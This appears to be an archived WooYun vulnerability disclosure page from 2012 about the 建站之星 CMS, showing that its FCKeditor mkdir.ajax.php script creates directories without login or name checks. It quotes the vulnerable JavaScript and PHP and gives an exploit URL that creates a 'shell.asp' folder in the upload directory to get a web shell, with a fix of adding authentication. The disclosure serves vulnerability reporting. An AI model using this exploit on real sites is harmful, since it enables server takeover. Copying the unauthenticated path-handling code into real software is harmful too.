@@ -1,0 +1,253 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		建站之星全版本后台通杀getshell  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		建站之星全版本后台通杀getshell  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/Drift">Drift</a> 
+</li><li>提交时间：		2012-06-29 10:10</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2012-06-29：	积极联系厂商并且等待厂商认领中，细节不对外公开<br/>
+									2012-06-29：	厂商已经主动忽略漏洞，细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">建站之星目前全版本后台拿shell漏洞</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">然后发现无法这玩意直接过滤了“.”创建不了解析文件夹，<br />
+<br />
+<br />
+<br />
+反复试了几次之后发现这个过滤是有延迟的。大概在0.1秒后 才会去掉。于是果断查看源码看函数：<br />
+<br />
+</p><p class="detail"><a href="../images/2900115852a03f7b7057001076bb545ab8e03fdc.jpg" target="_blank"><img src="../images/2900115852a03f7b7057001076bb545ab8e03fdc.jpg" alt="" width="600"/></a></p><p class="detail"><br />
+<br />
+</p><pre><code>function addSort(obj) {<br />
+ 	$(obj).parent().find(‘span’).css(‘display’,&#039;inline-block’);<br />
+ 	$(obj).css(‘display’,&#039;none’);<br />
+ 	$(obj).parent().find(‘span &gt; input:first’).focus();<br />
+ 	}<br />
+ 	 <br />
+ 	function newDir(obj) {<br />
+ 	var pth = $(obj).prev().attr(‘value’);<br />
+ 	var basepth = $(‘#gtcurdir option:selected’).text();<br />
+ 	if (pth.replace(/^\s+|\s+$/g,”).length == 0) { //这里对定义的PTH变量进行了判断,(“/^\s+|\s+$/g,”),思路是 判断如果文本框内不算以上字符 长度等于0则继续执行.<br />
+ 	alert(“请输入字符”);<br />
+ 	$(obj).prev().focus();<br />
+ 	return false;<br />
+ 	} else {<br />
+ 	$.ajax({<br />
+ 	type : “GET”,<br />
+ 	dataType : “text”,<br />
+ 	url : “../mkdir.ajax.php?basedir=”+basepth+”&amp;newdir=”+pth,//这里直接发送url 基本类型+新文件夹名+文件夹名。<br />
+ 	success : function(response) {<br />
+ 	switch (response) {<br />
+ 	case ’0′:<br />
+ 	$(obj).prev().val(”);<br />
+ 	$(obj).parent().css(‘display’,&#039;none’);<br />
+ 	$(obj).parent().parent().find(‘a’).css(‘display’,&#039;inline-block’);<br />
+ 	$(‘&lt;option value=”‘+basepth+pth+’/” selected=”true”&gt;’+basepth+pth+’/&lt;/option&gt;’).appendTo(‘#gtcurdir’);<br />
+ 	break;<br />
+ 	case ‘-1′:<br />
+ 	alert(“文件夹已存在！”);<br />
+ 	$(obj).prev().focus();<br />
+ 	break;<br />
+ 	case ‘-2′:<br />
+ 	alert(“新建文件夹失败！”);<br />
+ 	break;<br />
+ 	}<br />
+ 	},<br />
+ 	error : function(response) {<br />
+ 	alert(“请求失败！”);<br />
+ 	return false;<br />
+ 	}<br />
+ 	});<br />
+ 	}</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+看完函数 发现有一个很有意思的地方：<br />
+<br />
+<br />
+<br />
+</p><pre><code>url : “../mkdir.ajax.php?basedir=”+basepth+”&amp;newdir=”+pth,</code></pre><p class='detail'><br />
+<br />
+这里直接post出去命令。那么我们可否构造呢<br />
+<br />
+<br />
+<br />
+于是查看了这个脚本的源码：<br />
+<br />
+</p><pre><code>&lt;?php//！！！竟然没有验证<br />
+header(‘Conten-type:text/html; charset=UTF-8′);<br />
+define(‘SSFCK’, str_replace(“\\”, “/”, dirname(__FILE__)));<br />
+$adminRoot = str_replace(“\\”, “/”, substr(SSFCK, 0, -10));<br />
+define(‘SSROOT’, str_replace(“\\”, “/”, realpath($adminRoot.”/..”)));<br />
+<br />
+$err = ’0′;<br />
+$basedir = trim($_GET[&#039;basedir&#039;]);//这里直接GET来自前面那个urlpost来的变量<br />
+$newdir = trim($_GET[&#039;newdir&#039;]);<br />
+// is or not exist dir<br />
+$hd = dir(“../../”.$basedir);<br />
+while(($path = $hd-&gt;read()) !== false) {<br />
+if ($path == $newdir) {<br />
+$err = ‘-1′;<br />
+break;<br />
+} else continue;<br />
+}<br />
+<br />
+if ($err != ‘-1′) {<br />
+if (!mkdir(“../../{$basedir}{$newdir}”, 0755)) $err = ‘-2′;<br />
+}<br />
+<br />
+echo $err;<br />
+?&gt;</code></pre><p class='detail'><br />
+<br />
+程序员果然天然呆，不验证登陆，这里不验证文件名，任凭urlpost任意信息。<br />
+<br />
+<br />
+<br />
+到这里知道了程序漏洞所在。附上exp：<br />
+<br />
+<br />
+<br />
+</p><pre><code>http://localhost/admin/fckeditor/mkdir.ajax.php?basedir=upload/image/&amp;newdir=shell.asp</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+返回0则表示成功。 </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail">&lt;img src=&quot;</p><p class="detail"><a href="../images/2900115852a03f7b7057001076bb545ab8e03fdc.jpg" target="_blank"><img src="../images/2900115852a03f7b7057001076bb545ab8e03fdc.jpg" alt="" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+http://localhost/admin/fckeditor/mkdir.ajax.php?basedir=upload/image/&amp;newdir=shell.asp </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">对mkdir.ajax.php加验证 </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/Drift" title="Drift">Drift</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-08973" title="建站之星全版本后台通杀getshell">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+									<h3 class="detailTitle">厂商回应：</h3>
+										<p class="detail">未能联系到厂商或者厂商积极拒绝</p>
+																<p class="detail">漏洞Rank：8 (WooYun评价)</p>
+												
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="8973";
+var bugRating="-3";
+var myRating="";
+var ratingCount="1";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
